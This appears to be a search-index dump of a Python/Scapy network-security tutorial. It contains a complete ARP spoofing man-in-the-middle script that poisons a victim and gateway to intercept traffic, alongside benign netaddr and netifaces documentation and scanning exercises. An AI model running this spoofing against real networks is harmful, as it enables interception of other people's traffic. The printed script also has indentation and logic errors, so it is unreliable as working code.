hwdst= gm))\n\n\n\n\nStep III - Un-doing the attack/ Re-ARPing\n\n\nIt\ns not enough to trick the machines, once our attack is over, we need to re-assign the target\ns addresses so they know where to send their information properly. If we don\nt do this than it will be very obvious that something has happened.\n\n\ndef reARP():\n    print \n\\n[*] Restoring Targets...\n\n    victimMAC = get_mac(victimIP)\n    gatewayMAC = get_mac(gatewayIP)\n    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = \nff:ff:ff:ff:ff:ff\n, hwsrc = victimMAC), count = 7)\n    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = \nff:ff:ff:ff:ff:ff\n, hwsrc = gatewayMAC), count = 7)\n        disable_ip_forwarding()\n    print \n[*] Shutting Down...\n\n    sys.exit(1)\n\n\n\n\nFinal script\n\n\nfrom scapy.all import *\nimport sys\nimport os\nimport time\n\n\ndef help_text():\n    print(\n\\nUsage:\\n python hd_tcp_syn.py network_range\\n\n)\n    sys.exit()\n\ndef enable_ip_forwarding():\n    print \n\\n[*] Enabling IP Forwarding...\\n\n\n    os.system(\necho 1 \n /proc/sys/net/ipv4/ip_forward\n)\n\ndef disable_ip_forwarding():\n    print \n[*] Disabling IP Forwarding...\n\n    os.system(\necho 0 \n /proc/sys/net/ipv4/ip_forward\n)\n\ndef get_mac(IP):\n    conf.verb = 0\n    ans, unans = srp(Ether(dst = \nff:ff:ff:ff:ff:ff\n)/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)\n    for snd,rcv in ans:\n        return rcv.sprintf(r\n%Ether.src%\n)\n\ndef reARP():\n\n    print \n\\n[*] Restoring Targets...\n\n    victimMAC = get_mac(victimIP)\n    gatewayMAC = get_mac(gatewayIP)\n    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst = \nff:ff:ff:ff:ff:ff\n, hwsrc = victimMAC), count = 7)\n    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst = \nff:ff:ff:ff:ff:ff\n, hwsrc = gatewayMAC), count = 7)\n    disable_ip_forwarding()\n    print \n[*] Shutting Down...\n\n    sys.exit(1)\n\ndef trick(gm, vm):\n    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))\n    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))\n\ndef mitm():\n    try:\n        victimMAC = get_mac(victimIP)\n    except Exception:\n        disable_ip_forwarding()\n        print \n[!] Couldn't Find Victim MAC Address\n\n        print \n[!] Exiting...\n\n    sys.exit(1)\n    try:\n        gatewayMAC = get_mac(gatewayIP)\n    except Exception:\n        disable_ip_forwarding()\n        print \n[!] Couldn't Find Gateway MAC Address\n\n    print \n[!] Exiting...\n\n        sys.exit(1)\n    print \n[*] Poisoning Targets...\n    \n    while 1:\n    try:\n        trick(gatewayMAC, victimMAC)\n            time.sleep(1.5)\n    except KeyboardInterrupt:\n        reARP()\n        break\n\nif __name__ == '__main__':\n    if len(sys.argv) \n 2:\n        help_text()\n    interface = sys.argv[1]\n    victimIP = sys.argv[2]\n    gatewayIP = sys.argv[3] \n    enable_ip_forwarding()\n    mitm()", 
            "title": "ARP spoofing"
        }, 
        {
            "location": "/network_attacks/arp_spoofing/index.html#arp-spoofingmitm", 
            "text": "Messing with ARP   ARP attacks can potentially mess your LAN configuration. Be very cautious about testing these attacks/scripts in production environment(or in any network for that matter)  Fortunately any potential mis-configuration will be corrected to orignal state in few minutes. If you do happen to mess up your LAN, take a walk, come back several minutes later, pretend that the network was still working when you left.      In common hub networks all traffic can be seen by all hosts whose NICs (network interface card) are in promiscuous mode, but things are a bit different on switched networks.  A switch looks at the data sent to it and tries to only forward packets to its intended recipient based on the MAC address.  Switched networks are more secure and help speed up the network by only sending packets where they need to go.  There are ways around switches though. Using a program like Arpspoof (part of the Dsniff package), we can lie to other machines on the local area network and tell them we have the IP they are looking for, thus funneling their traffic through us.       In the above image, the attacker is telling Alan s box that he has the IP that corresponds to Brian s box and vice versa. By doing this the attacker receives all network traffic going between Alan and Brian. Once the attacker has ARP Spoofed his way between two nodes he can sniff the connection. By ARP Spoofing between a computer and the LAN s gateway an attacker can see all the traffic the computer is sending out and receiving.   Step I- IP forwarding   Make sure that the kernel IP forwarding is enabled, otherwise our machine will drop all traffic between the hosts we are trying to sniff, causing a denial of service.( IP forwarding  is a synonym for  routing.  It is called  kernel IP forwarding  because it is a feature of the Linux kernel.)    import os  os.system('echo 1   /proc/sys/net/ipv4/ip_forward')           # enable kernel IP forwarding  os.system('echo 0   /proc/sys/net/ipv4/ip_forward')           # disable kernel IP forwarding  More on kernel IP forwarding:  What is kernel IP forwarding?  Step II - Gather MAC addresses  In order to create our ARP responses, we ll need the victim and router MAC addresses. We can do this by making ARP requests and returning the result.  def get_mac(IP):\n    ans, unans = srp(Ether(dst =  ff:ff:ff:ff:ff:ff )/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)\n    for snd,rcv in ans:\n        return rcv.sprintf(r %Ether.src% )  Step III - Tricking the Targets  In this step we are tricking eachmachine into thinking that the other party is our machine. \nARP reply to each of the targets telling them that we are the other target, placing ourselves in between them.  def trick(gm, vm):\n    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))\n    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))  Step III - Un-doing the attack/ Re-ARPing  It s not enough to trick the machines, once our attack is over, we need to re-assign the target s addresses so they know where to send their information properly. If we don t do this than it will be very obvious that something has happened.  def reARP():\n    print  \\n[*] Restoring Targets... \n    victimMAC = get_mac(victimIP)\n    gatewayMAC = get_mac(gatewayIP)\n    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst =  ff:ff:ff:ff:ff:ff , hwsrc = victimMAC), count = 7)\n    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst =  ff:ff:ff:ff:ff:ff , hwsrc = gatewayMAC), count = 7)\n        disable_ip_forwarding()\n    print  [*] Shutting Down... \n    sys.exit(1)  Final script  from scapy.all import *\nimport sys\nimport os\nimport time\n\n\ndef help_text():\n    print( \\nUsage:\\n python hd_tcp_syn.py network_range\\n )\n    sys.exit()\n\ndef enable_ip_forwarding():\n    print  \\n[*] Enabling IP Forwarding...\\n \n    os.system( echo 1   /proc/sys/net/ipv4/ip_forward )\n\ndef disable_ip_forwarding():\n    print  [*] Disabling IP Forwarding... \n    os.system( echo 0   /proc/sys/net/ipv4/ip_forward )\n\ndef get_mac(IP):\n    conf.verb = 0\n    ans, unans = srp(Ether(dst =  ff:ff:ff:ff:ff:ff )/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)\n    for snd,rcv in ans:\n        return rcv.sprintf(r %Ether.src% )\n\ndef reARP():\n\n    print  \\n[*] Restoring Targets... \n    victimMAC = get_mac(victimIP)\n    gatewayMAC = get_mac(gatewayIP)\n    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst =  ff:ff:ff:ff:ff:ff , hwsrc = victimMAC), count = 7)\n    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst =  ff:ff:ff:ff:ff:ff , hwsrc = gatewayMAC), count = 7)\n    disable_ip_forwarding()\n    print  [*] Shutting Down... \n    sys.exit(1)\n\ndef trick(gm, vm):\n    send(ARP(op = 2, pdst = victimIP, psrc = gatewayIP, hwdst= vm))\n    send(ARP(op = 2, pdst = gatewayIP, psrc = victimIP, hwdst= gm))\n\ndef mitm():\n    try:\n        victimMAC = get_mac(victimIP)\n    except Exception:\n        disable_ip_forwarding()\n        print  [!] Couldn't Find Victim MAC Address \n        print  [!] Exiting... \n    sys.exit(1)\n    try:\n        gatewayMAC = get_mac(gatewayIP)\n    except Exception:\n        disable_ip_forwarding()\n        print  [!] Couldn't Find Gateway MAC Address \n    print  [!] Exiting... \n        sys.exit(1)\n    print  [*] Poisoning Targets...     \n    while 1:\n    try:\n        trick(gatewayMAC, victimMAC)\n            time.sleep(1.5)\n    except KeyboardInterrupt:\n        reARP()\n        break\n\nif __name__ == '__main__':\n    if len(sys.argv)   2:\n        help_text()\n    interface = sys.argv[1]\n    victimIP = sys.argv[2]\n    gatewayIP = sys.argv[3] \n    enable_ip_forwarding()\n    mitm()", 
            "title": "ARP Spoofing(MiTM)"
        }, 
        {
            "location": "/libraries/netaddr/index.html", 
            "text": "netaddr\n\n\nOverview\n\n\nA Python library for representing and manipulating network addresses.\n\n\nProvides support for:\n\n\nLayer 3 addresses\n\n\n\n\nIPv4 and IPv6 addresses, subnets, masks, prefixes\n\n\niterating, slicing, sorting, summarizing and classifying IP networks\n\n\ndealing with various ranges formats (CIDR, arbitrary ranges and globs, nmap)\n\n\nset based operations (unions, intersections etc) over IP addresses and subnets\n\n\nparsing a large variety of different formats and notations\n\n\nlooking up IANA IP block information\n\n\ngenerating DNS reverse lookups\n\n\nsupernetting and subnetting\n\n\n\n\nLayer 2 addresses\n\n\n\n\nrepresentation and manipulation MAC addresses and EUI-64 identifiers\n\n\nlooking up IEEE organisational information (OUI, IAB)\n\n\ngenerating derived IPv6 addresses\n\n\n\n\nInstallation\n\n\nInstall the latest \nnetaddr\n from PIP\n\n\npip install netaddr\n\n\n\n\nImporting netaddr\n\n\nfrom netaddr import *\n\n\n\n\n\n\nimporting modules\n\n\nImporting this way is not optimal and leads to name clashes.\n\nIn your own code, you should be explicit about the classes,\nfunctions and constants you import to avoid name clashes.\n\n\n\n\nLayer 3 addressing(IP)\n\n\nIPAddress\n\n\nIPAddress object represents a single IP address.\n\n\n from netaddr import IPAddress\n\n\n\n ip = IPAddress('192.21.8.11')\n\n ip.version\n4\n\n dir(ip)\n[ ... Snipped... 'bin', 'bits', 'format', 'info', 'ipv4', 'ipv6', \n'is_hostmask', 'is_ipv4_compat', 'is_ipv4_mapped', 'is_link_local',\n'is_loopback', 'is_multicast', 'is_netmask', 'is_private', 'is_reserved',\n'is_unicast', 'key', 'netmask_bits', 'packed', 'reverse_dns', 'sort_key',\n'value', 'version', 'words']\n\n \n\n\n\n\n\nThere are methods to handle coverting an IP adress into binary or bits, split an IP, pack an\n\n\n ip.bin\n'0b11000000000101010000100000001011'\n\n \n\n ip.bits()\n'11000000.00010101.00001000.00001011'\n\n \n\n ip.words\n(192, 21, 8, 11)\n\n ip.packed\n'\\xc0\\x15\\x08\\x0b'\n\n\n\n\n\nThere are methods to check if the type of IP address(class, scope, type)\n\n\n ip.version\n6\n\n ip.is_unicast()\nTrue\n\n \n\n ip.is_link_local()\nTrue\n\n\n\n\nIPNetwork\n\n\nIPNetwork objects are used to represent subnets, networks or VLANs that accept CIDR prefixes and netmasks.\n\n\n from netaddr import IPNetwork\n\n \n\n ip_range = IPNetwork('192.241.21.6/24')\n\n \n\n dir(ip_range)\n[ ... snipped ...  'broadcast', 'cidr', 'first', 'hostmask', 'info',\n'ip', 'ipv4', 'ipv6', 'is_ipv4_compat', 'is_ipv4_mapped', 'is_link_local',\n'is_loopback', 'is_multicast', 'is_private', 'is_reserved', 'is_unicast',\n'iter_hosts', 'key', 'last', 'netmask', 'network', 'next', 'prefixlen',\n'previous', 'size', 'sort_key', 'subnet', 'supernet', 'value', 'version']\n\n\n\n\n\n\nThere are a bunch of methods associated with IPNetwork to understand the network defined.\n\n\n ip_range.network\nIPAddress('192.241.21.0')\n\n\n\n ip_range.hostmask\nIPAddress('0.0.0.255')\n\n \n\n ip_range.netmask\nIPAddress('255.255.255.0')\n\n\n\n ip_range.broadcast\nIPAddress('192.241.21.255')\n\n\n\n ip_range.size\n256\n\n\n\n\nYou can use a simple for loop to iterate over the list of IP addresses in the network range defined.\n\n\n for i in ip_range:\n...     print i\n... \n192.241.21.0\n192.241.21.1\n... snipped ...\n192.241.21.255\n\n\n\n\n\nList operations on IPNetwork object\n\n\nIf you treat an IPNetwork object as if it were a standard Python list object it will give you access to a list of individual\nIP address objects also various standard python list methods.\n\n\n ip_range = IPNetwork('192.0.2.16/29')\n\n \n\n ip_range_list = list(ip_range)\n\n \n\n len(ip_range_list)\n8\n\n ip_range_list\n[IPAddress('192.0.2.16'), IPAddress('192.0.2.17'), ...snipped... IPAddress('192.0.2.23')]\n\n\n\n ip_range_list[6]        # indexing\nIPAddress('192.0.2.22')\n\n\n\n ip_range_list[2:5\n\n]      # slicing\n[IPAddress('192.0.2.18'), IPAddress('192.0.2.19'), IPAddress('192.0.2.20')]\n\n\n\n\nIPRange\n\n\nYou can represent an arbitrary IP address range using a lower and upper bound address in the form of an IPRange\nobject.\n\n\n ip_range = IPRange('192.168.1.0', '192.168.1.20')\n\n \n\n for i in ip_range:\n...     print i\n... \n192.168.1.0\n... snipped ...\n192.168.1.19\n192.168.1.20\n\n\n\n\nIP sets\n\n\nYou can specify either IP addresses and networks as strings. Alternatively, you can use IPAddress, IPNetwork, IPRange\nor other IPSet objects.\n\n\n IPSet(['192.0.2.0'])\nIPSet(['192.0.2.0/32'])\n\n\n\n IPSet([IPAddress('192.0.2.0')])\nIPSet(['192.0.2.0/32'])\n\n\n\n IPSet([IPNetwork('192.0.2.0/24')])\nIPSet(['192.0.2.0/24'])\n\n\n\n IPSet(IPRange(\n10.0.0.0\n, \n10.0.1.31\n))\nIPSet(['10.0.0.0/24', '10.0.1.0/27'])\n\n\n\n\nYou can interate over all the IP addresses that are members of the IP set.\n\n\n for ip in IPSet(['192.0.2.0/28']):\n...     print ip\n192.0.2.0\n192.0.2.1\n... snipped ...\n192.168.2.15\n\n\n\n\nAdding and removing set elements\n\n\n from netaddr import IPSet\n\n \n\n s1 = IPSet()\n\n \n\n s1.add('192.168.1.0/30')\n\n s1.size\n4\n\n \n\n '192.168.1.3' in s1\nTrue\n\n \n\n s1.remove('192.168.1.3')\n\n s1.size\n3\n\n\n\n\nYou can do all sorts of set operations on IPSets \n\n\n scan1 = IPSet(['192.168.1.0/30'])\n\n \n\n scan1\nIPSet(['192.168.1.0/30'])\n\n \n\n scan1.size\n4\n\n \n\n scan2 = IPSet(['192.168.1.0/31'])\n\n \n\n scan2.size\n2\n\n \n\n scan1 | scan2\nIPSet(['192.168.1.0/30'])\n\n \n\n scan1 \n scan2\nIPSet(['192.168.1.0/31'])\n\n\n\n scan1 ^ scan2\nIPSet(['192.168.1.2/31'])\n\n\n\n\n\n\nLayer 2 addressing(MAC)\n\n\nInstances of the EUI class are used to represent MAC addresses.\n\n\n mac = EUI('ec:f4:bb:87:2d:0c')\n\n\n\n\nThere are methods to print out common properties of an address\n\n\n dir(mac)\n ... snipped ... 'bin', 'bits', 'dialect', 'ei', 'eui64', 'iab',\n'info', 'ipv6', 'ipv6_link_local', 'is_iab', 'modified_eui64', 'oui',\n'packed', 'value', 'version', 'words']\n\n\n\n str(mac), str(mac.ei), str(mac.oui), str(mac.version)\n('EC-F4-BB-87-2D-0C', '87-2D-0C', 'EC-F4-BB', '48')\n\n\n\n\nThere are methods to provide info on OUI and other organizational info.\n\n\n mac.info\n{'OUI': {'address': ['one dell way',\n             'MS:RR5-45',\n             'Round rock Texas 78682',\n             'UNITED STATES'],\n 'idx': 15529147,\n 'offset': 3429092,\n 'org': 'Dell Inc',\n 'oui': 'EC-F4-BB',\n 'size': 141}}\n\n \n\n\n\n\n oui = mac.oui\n\n \n\n dir(oui)\n[ ... snipped ... 'records', 'reg_count', 'registration']\n\n \n\n oui.registration().org\n'Dell Inc'\n\n\n\n oui.registration().address\n['one dell way', 'MS:RR5-45', 'Round rock Texas 78682', 'UNITED STATES']\n\n\n\n\n\n\nExamples of netaddr usage in open source projects\n\n\n\n\nFor more examples of various netaddr modules usage in open source projects: \nPython netaddr examples", 
            "title": "netaddr"
        }, 
        {
            "location": "/libraries/netaddr/index.html#netaddr", 
            "text": "", 
            "title": "netaddr"
        }, 
        {
            "location": "/libraries/netaddr/index.html#overview", 
            "text": "A Python library for representing and manipulating network addresses.  Provides support for:  Layer 3 addresses   IPv4 and IPv6 addresses, subnets, masks, prefixes  iterating, slicing, sorting, summarizing and classifying IP networks  dealing with various ranges formats (CIDR, arbitrary ranges and globs, nmap)  set based operations (unions, intersections etc) over IP addresses and subnets  parsing a large variety of different formats and notations  looking up IANA IP block information  generating DNS reverse lookups  supernetting and subnetting   Layer 2 addresses   representation and manipulation MAC addresses and EUI-64 identifiers  looking up IEEE organisational information (OUI, IAB)  generating derived IPv6 addresses", 
            "title": "Overview"
        }, 
        {
            "location": "/libraries/netaddr/index.html#installation", 
            "text": "Install the latest  netaddr  from PIP  pip install netaddr", 
            "title": "Installation"
        }, 
        {
            "location": "/libraries/netaddr/index.html#importing-netaddr", 
            "text": "from netaddr import *   importing modules  Importing this way is not optimal and leads to name clashes. \nIn your own code, you should be explicit about the classes,\nfunctions and constants you import to avoid name clashes.", 
            "title": "Importing netaddr"
        }, 
        {
            "location": "/libraries/netaddr/index.html#layer-3-addressingip", 
            "text": "", 
            "title": "Layer 3 addressing(IP)"
        }, 
        {
            "location": "/libraries/netaddr/index.html#ipaddress", 
            "text": "IPAddress object represents a single IP address.   from netaddr import IPAddress   ip = IPAddress('192.21.8.11')  ip.version\n4  dir(ip)\n[ ... Snipped... 'bin', 'bits', 'format', 'info', 'ipv4', 'ipv6', \n'is_hostmask', 'is_ipv4_compat', 'is_ipv4_mapped', 'is_link_local',\n'is_loopback', 'is_multicast', 'is_netmask', 'is_private', 'is_reserved',\n'is_unicast', 'key', 'netmask_bits', 'packed', 'reverse_dns', 'sort_key',\n'value', 'version', 'words']    \nThere are methods to handle coverting an IP adress into binary or bits, split an IP, pack an   ip.bin\n'0b11000000000101010000100000001011'    ip.bits()\n'11000000.00010101.00001000.00001011'    ip.words\n(192, 21, 8, 11)  ip.packed\n'\\xc0\\x15\\x08\\x0b'  \nThere are methods to check if the type of IP address(class, scope, type)   ip.version\n6  ip.is_unicast()\nTrue    ip.is_link_local()\nTrue", 
            "title": "IPAddress"
        }, 
        {
            "location": "/libraries/netaddr/index.html#ipnetwork", 
            "text": "IPNetwork objects are used to represent subnets, networks or VLANs that accept CIDR prefixes and netmasks.   from netaddr import IPNetwork    ip_range = IPNetwork('192.241.21.6/24')    dir(ip_range)\n[ ... snipped ...  'broadcast', 'cidr', 'first', 'hostmask', 'info',\n'ip', 'ipv4', 'ipv6', 'is_ipv4_compat', 'is_ipv4_mapped', 'is_link_local',\n'is_loopback', 'is_multicast', 'is_private', 'is_reserved', 'is_unicast',\n'iter_hosts', 'key', 'last', 'netmask', 'network', 'next', 'prefixlen',\n'previous', 'size', 'sort_key', 'subnet', 'supernet', 'value', 'version']   There are a bunch of methods associated with IPNetwork to understand the network defined.   ip_range.network\nIPAddress('192.241.21.0')   ip_range.hostmask\nIPAddress('0.0.0.255')    ip_range.netmask\nIPAddress('255.255.255.0')   ip_range.broadcast\nIPAddress('192.241.21.255')   ip_range.size\n256  You can use a simple for loop to iterate over the list of IP addresses in the network range defined.   for i in ip_range:\n...     print i\n... \n192.241.21.0\n192.241.21.1\n... snipped ...\n192.241.21.255", 
            "title": "IPNetwork"
        }, 
        {
            "location": "/libraries/netaddr/index.html#list-operations-on-ipnetwork-object", 
            "text": "If you treat an IPNetwork object as if it were a standard Python list object it will give you access to a list of individual\nIP address objects also various standard python list methods.   ip_range = IPNetwork('192.0.2.16/29')    ip_range_list = list(ip_range)    len(ip_range_list)\n8  ip_range_list\n[IPAddress('192.0.2.16'), IPAddress('192.0.2.17'), ...snipped... IPAddress('192.0.2.23')]   ip_range_list[6]        # indexing\nIPAddress('192.0.2.22')   ip_range_list[2:5\n\n]      # slicing\n[IPAddress('192.0.2.18'), IPAddress('192.0.2.19'), IPAddress('192.0.2.20')]", 
            "title": "List operations on IPNetwork object"
        }, 
        {
            "location": "/libraries/netaddr/index.html#iprange", 
            "text": "You can represent an arbitrary IP address range using a lower and upper bound address in the form of an IPRange\nobject.   ip_range = IPRange('192.168.1.0', '192.168.1.20')    for i in ip_range:\n...     print i\n... \n192.168.1.0\n... snipped ...\n192.168.1.19\n192.168.1.20", 
            "title": "IPRange"
        }, 
        {
            "location": "/libraries/netaddr/index.html#ip-sets", 
            "text": "You can specify either IP addresses and networks as strings. Alternatively, you can use IPAddress, IPNetwork, IPRange\nor other IPSet objects.   IPSet(['192.0.2.0'])\nIPSet(['192.0.2.0/32'])   IPSet([IPAddress('192.0.2.0')])\nIPSet(['192.0.2.0/32'])   IPSet([IPNetwork('192.0.2.0/24')])\nIPSet(['192.0.2.0/24'])   IPSet(IPRange( 10.0.0.0 ,  10.0.1.31 ))\nIPSet(['10.0.0.0/24', '10.0.1.0/27'])  You can interate over all the IP addresses that are members of the IP set.   for ip in IPSet(['192.0.2.0/28']):\n...     print ip\n192.0.2.0\n192.0.2.1\n... snipped ...\n192.168.2.15", 
            "title": "IP sets"
        }, 
        {
            "location": "/libraries/netaddr/index.html#adding-and-removing-set-elements", 
            "text": "from netaddr import IPSet    s1 = IPSet()    s1.add('192.168.1.0/30')  s1.size\n4    '192.168.1.3' in s1\nTrue    s1.remove('192.168.1.3')  s1.size\n3  You can do all sorts of set operations on IPSets    scan1 = IPSet(['192.168.1.0/30'])    scan1\nIPSet(['192.168.1.0/30'])    scan1.size\n4    scan2 = IPSet(['192.168.1.0/31'])    scan2.size\n2    scan1 | scan2\nIPSet(['192.168.1.0/30'])    scan1   scan2\nIPSet(['192.168.1.0/31'])   scan1 ^ scan2\nIPSet(['192.168.1.2/31'])", 
            "title": "Adding and removing set elements"
        }, 
        {
            "location": "/libraries/netaddr/index.html#layer-2-addressingmac", 
            "text": "Instances of the EUI class are used to represent MAC addresses.   mac = EUI('ec:f4:bb:87:2d:0c')  There are methods to print out common properties of an address   dir(mac)\n ... snipped ... 'bin', 'bits', 'dialect', 'ei', 'eui64', 'iab',\n'info', 'ipv6', 'ipv6_link_local', 'is_iab', 'modified_eui64', 'oui',\n'packed', 'value', 'version', 'words']   str(mac), str(mac.ei), str(mac.oui), str(mac.version)\n('EC-F4-BB-87-2D-0C', '87-2D-0C', 'EC-F4-BB', '48')  There are methods to provide info on OUI and other organizational info.   mac.info\n{'OUI': {'address': ['one dell way',\n             'MS:RR5-45',\n             'Round rock Texas 78682',\n             'UNITED STATES'],\n 'idx': 15529147,\n 'offset': 3429092,\n 'org': 'Dell Inc',\n 'oui': 'EC-F4-BB',\n 'size': 141}}     oui = mac.oui    dir(oui)\n[ ... snipped ... 'records', 'reg_count', 'registration']    oui.registration().org\n'Dell Inc'   oui.registration().address\n['one dell way', 'MS:RR5-45', 'Round rock Texas 78682', 'UNITED STATES']   Examples of netaddr usage in open source projects   For more examples of various netaddr modules usage in open source projects:  Python netaddr examples", 
            "title": "Layer 2 addressing(MAC)"
        }, 
        {
            "location": "/libraries/netifaces/index.html", 
            "text": "netifaces\n\n\n\n\nA portable third-party library in Python to enumerate network interfaces on local machine.\n\n\nHistorically it has been difficult to straightforwardly get the network address(es) of the machine on which your Python scripts are running without compromising the portability of your script.\n\n\nnetifaces takes care of enumerating interfaces, network addresses and also preserves the portability(works on all *nix systems atleast).\n\n\n\n\nInstallation\n\n\n\n\nnetifaces needs python extension modules. In case you haven\nt already, you should install python-dev package.\n\n\n\n\nverax@humla ~ $ sudo apt-get install python-dev\n\n\n\n\n\n\nYou can install netifaces using PIP.\n\n\n\n\nverax@humla ~ $ pip install netifaces\n\n\n\n\nBasic operations\n\n\nYou can take a look at all the modules that are part of netifaces\n\n\n import netifaces\n\n \n\n dir(netifaces)\n[ ... snipped ...\n'address_families', 'gateways', 'ifaddresses', 'interfaces', 'version']\n\n \n\n\n\n\n\nGetting a list of all the network interface identifiers on the machine.\n\n\n netifaces.interfaces()\n['lo', 'eth0', 'wlan0', 'eth3', 'vboxnet0']\n\n\n\n\nYou can ask for the addresses of a particular interface\n\n\n import netifaces\n\n from pprint import pprint\n\n\n\n pprint(netifaces.ifaddresses('eth3'))\n{2: [{'addr': '192.168.1.100',\n      'broadcast': '192.168.1.255',\n      'netmask': '255.255.255.0'}],\n 10: [{'addr': 'fe80::364b:50ff:feb7:ef1d%eth3',\n       'netmask': 'ffff:ffff:ffff:ffff::/64'}],\n 17: [{'addr': '34:4b:50:b7:ef:1d', 'broadcast': 'ff:ff:ff:ff:ff:ff'}]}\n\n\n\n\n\n\npprint\n\n\n\n\npprint\n contains a \u201cpretty printer\u201d for producing aesthetically pleasing representations of your data structures.\n\n\nThe formatter produces representations of data structures that can be parsed correctly by the interpreter, and are also easy for a human to read\n\n\n\n\n\n\nYou can also get list of all the gateways\n\n\n netifaces.gateways()\n{'default': {2: ('192.168.1.1', 'eth3')}, 2: [('192.168.1.1', 'eth3', True)]}\n\n\n\n\nGetting list of IPv4 addresses excluding loopback and virtualbox adapters\n\n\n for iface in netifaces.interfaces():\n...     if iface == 'lo' or iface.startswith('vbox'):\n...         continue\n...     iface_details = netifaces.ifaddresses(iface)\n...     if iface_details.has_key(netifaces.AF_INET):\n...         print iface_details[netifaces.AF_INET]\n... \n[{'broadcast': '192.168.1.255', 'netmask': '255.255.255.0', 'addr': '192.168.1.100'}]\n[{'broadcast': '192.168.1.255', 'netmask': '255.255.255.0', 'addr': '192.168.1.101'}]\n\n\n\n\n\n\nExamples of netifaces usage in open source projects\n\n\n\n\nFor more examples of netifaces usage in open source projects: \nnetifaces examples", 
            "title": "netifaces"
        }, 
        {
            "location": "/libraries/netifaces/index.html#netifaces", 
            "text": "A portable third-party library in Python to enumerate network interfaces on local machine.  Historically it has been difficult to straightforwardly get the network address(es) of the machine on which your Python scripts are running without compromising the portability of your script.  netifaces takes care of enumerating interfaces, network addresses and also preserves the portability(works on all *nix systems atleast).", 
            "title": "netifaces"
        }, 
        {
            "location": "/libraries/netifaces/index.html#installation", 
            "text": "netifaces needs python extension modules. In case you haven t already, you should install python-dev package.   verax@humla ~ $ sudo apt-get install python-dev   You can install netifaces using PIP.   verax@humla ~ $ pip install netifaces", 
            "title": "Installation"
        }, 
        {
            "location": "/libraries/netifaces/index.html#basic-operations", 
            "text": "You can take a look at all the modules that are part of netifaces   import netifaces    dir(netifaces)\n[ ... snipped ...\n'address_families', 'gateways', 'ifaddresses', 'interfaces', 'version']    Getting a list of all the network interface identifiers on the machine.   netifaces.interfaces()\n['lo', 'eth0', 'wlan0', 'eth3', 'vboxnet0']  You can ask for the addresses of a particular interface   import netifaces  from pprint import pprint   pprint(netifaces.ifaddresses('eth3'))\n{2: [{'addr': '192.168.1.100',\n      'broadcast': '192.168.1.255',\n      'netmask': '255.255.255.0'}],\n 10: [{'addr': 'fe80::364b:50ff:feb7:ef1d%eth3',\n       'netmask': 'ffff:ffff:ffff:ffff::/64'}],\n 17: [{'addr': '34:4b:50:b7:ef:1d', 'broadcast': 'ff:ff:ff:ff:ff:ff'}]}   pprint   pprint  contains a \u201cpretty printer\u201d for producing aesthetically pleasing representations of your data structures.  The formatter produces representations of data structures that can be parsed correctly by the interpreter, and are also easy for a human to read    You can also get list of all the gateways   netifaces.gateways()\n{'default': {2: ('192.168.1.1', 'eth3')}, 2: [('192.168.1.1', 'eth3', True)]}  Getting list of IPv4 addresses excluding loopback and virtualbox adapters   for iface in netifaces.interfaces():\n...     if iface == 'lo' or iface.startswith('vbox'):\n...         continue\n...     iface_details = netifaces.ifaddresses(iface)\n...     if iface_details.has_key(netifaces.AF_INET):\n...         print iface_details[netifaces.AF_INET]\n... \n[{'broadcast': '192.168.1.255', 'netmask': '255.255.255.0', 'addr': '192.168.1.100'}]\n[{'broadcast': '192.168.1.255', 'netmask': '255.255.255.0', 'addr': '192.168.1.101'}]   Examples of netifaces usage in open source projects   For more examples of netifaces usage in open source projects:  netifaces examples", 
            "title": "Basic operations"
        }, 
        {
            "location": "/exercises/misc_exercises/index.html", 
            "text": "Miscellaneous exercises\n\n\n\n\nExercise 1\n\n\nNetwork sweeping\n\n\n\n\nWrite a script to perform network sweeping i.e. given a IP address range, find all the machines that are alive.\n\n\nUse any of the host discovery techniques that have been discussed but ARP tends to be neat and faster on local networks.\n\n\n\n\nverax@untamed  $ sudo python hd_tcp_syn.py 192.168.56.99-110\n 192.168.56.102 is alive\n 192.168.56.103 is alive\n 192.168.56.107 is alive\n\n\n\n\nExercise 2\n\n\nPort scanning\n\n\n\n\nWrite a script to perform port scanning i.e. given an IP address, find status of ports on the machine(atleast find any open ports under 1024).\n\n\nUse any of the port scanning techniques that have been discussed.\n\n\n\n\nverax@untamed  $ sudo python tcp_syn_scan.py 192.168.56.107\n'ftp_data    RA'\n'21          RA\n'ssh         SA'\n'telnet      RA'\n'24          RA'\n\n\n\n\nExercise 3\n\n\nIP ID pattern finder\n\n\n\n\nWrite a script that takes a target IP and checks for patterns in the IP ID generation.\n\n\nBasic checks include: if the IP IDs generated are: all zeros, are all constant, are all randomized or if they are incremental.\n\n\n\n\nExample:\n\n\nverax@humla $ sudo python ipidseq.py 192.168.56.101\n\nTarget =\n 192.168.56.101\n\n[+] Sending packets to the target\n[+] Analyzing the IPID pattern\n[*] IPID generation pattern on scanme.nmap.org is randomized\n\n\n\n\nPython/Scapy tips:\n\n\n\n\nUse \nsr1\nfor sending packet and recieving first response\n\n\nPython has in-built function \nall()\n that comes handy when comparing elements in list. Looking at below examples, think about how you can use it to do other comparisions.\n\n\n\n\n lis = [0,0,0,0]\n\n all(v == 0 for v in lis)       # Checking if all elements in list are zero\nTrue \n\n\n\n\n lis = [1,4,6,9,22,65,98,354]\n\n \n\n all(x\ny for x, y in zip(lis, lis[1:]))  # Checking if the elements are in increasing order\nTrue\n\n\n\n\nMore on Python\ns \nany()\n and \nall()\n:\n\n\n\nAny and all\n \n\n\ncheck-list-monotonicity in Python\n \n\n\nHow do Python\ns any and all functions work?\n \n\n\nSolution hints I:\n\n\n\n\nSend packets to target IP address, save the IPIDs from responses in a data structure. (looping might help)\n\n\nCompare the 